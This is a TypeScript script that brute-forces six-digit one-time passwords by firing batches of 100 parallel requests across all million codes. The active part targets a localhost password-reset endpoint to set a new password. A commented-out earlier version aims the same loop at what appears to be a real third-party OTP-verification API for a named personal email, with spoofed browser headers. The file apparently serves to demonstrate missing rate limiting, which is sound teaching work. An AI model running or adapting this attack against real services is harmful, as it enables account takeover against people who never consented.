// import axios from "axios";

// async function sendRequest(otp:string) {

//     let config = {
//       method: 'get',
//       maxBodyLength: Infinity,
//       url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=akhil2771999%40gmail.com&otp='+otp,
//       headers: { 
//         'accept': '*/*', 
//         'accept-language': 'en-US,en;q=0.9', 
//         'auth-key': 'appxapi', 
//         'client-service': 'Appx', 
//         'device-type': '', 
//         'origin': 'https://harkirat.classx.co.in', 
//         'priority': 'u=1, i', 
//         'referer': 'https://harkirat.classx.co.in/', 
//         'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', 
//         'sec-ch-ua-mobile': '?0', 
//         'sec-ch-ua-platform': '"Windows"', 
//         'sec-fetch-dest': 'empty', 
//         'sec-fetch-mode': 'cors', 
//         'sec-fetch-site': 'same-site', 
//         'source': 'website', 
//         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
//       }
//     };
// try{

//     await  axios.request(config)
// }
//     catch(err){
//         console.log(err)
//     }
// }
// async function main() {
//   for (let i = 0; i <=999999; i+=100) {
//     const promises = [];
//     console.log("here for " + i);
//     for (let j = 0; j < 100; j++) {
//       promises.push(sendRequest((i + j).toString()));
//     }
//     await Promise.all(promises);
//   }
// }

// main()

import axios from "axios";

async function sendRequest(otp: number) {
  let data = JSON.stringify({
    "email": "akhil@gmail.com",
    "otp": otp,
    "newPassword": "123123123"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: {
      'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
      'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
      'sec-ch-ua-mobile': '?0',
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
      'Accept': 'text/x-component',
      'Referer': 'http://localhost:3000/admin',
      'Next-Action': 'a221b071140e55563e91a3226c508cb229c121f6',
      'sec-ch-ua-platform': '"macOS"',
      'Content-Type': 'application/json'
    },
    data: data
  };

  try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch(e) {
    
  }
}

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()